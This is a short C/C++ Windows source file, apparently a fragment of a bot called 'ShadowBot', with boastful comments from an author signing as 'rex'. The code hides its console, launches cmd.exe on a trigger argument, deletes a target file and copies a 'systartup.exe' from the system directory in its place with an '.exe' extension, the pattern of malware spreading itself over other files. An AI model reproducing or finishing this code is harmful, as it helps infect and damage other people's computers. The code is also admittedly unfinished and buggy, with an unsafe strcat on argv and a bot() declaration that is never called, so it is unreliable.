/*
written by fuck knows KMFAO i forgot -rex :D
make sure to name as .cpp file for msvs 2005 to compile correctly!
im in yo skool killin yo sheep =P
Needs fixing yow
*/

// this is gonna own
#include <windows.h>
#include <stdio.h>
#include <string.h>


int main(int argc, char *argv[])
{
FreeConsole();
if (argc != 1)
{
  if (strstr(argv[1], "ShadowBot.jpg"))
  {
   WinExec("cmd.exe", SW_SHOW);
  }
  char windir[MAX_PATH];
  GetSystemDirectory(windir, sizeof(windir));
  strcat(windir, "\\systartup.exe");
  char *args = argv[1];
  DeleteFile(args);
  strcat(args, ".exe");
  CopyFile(windir, args, 0);
  SetFileAttributes(args, FILE_ATTRIBUTE_NORMAL);
}
void bot();
return 0;
}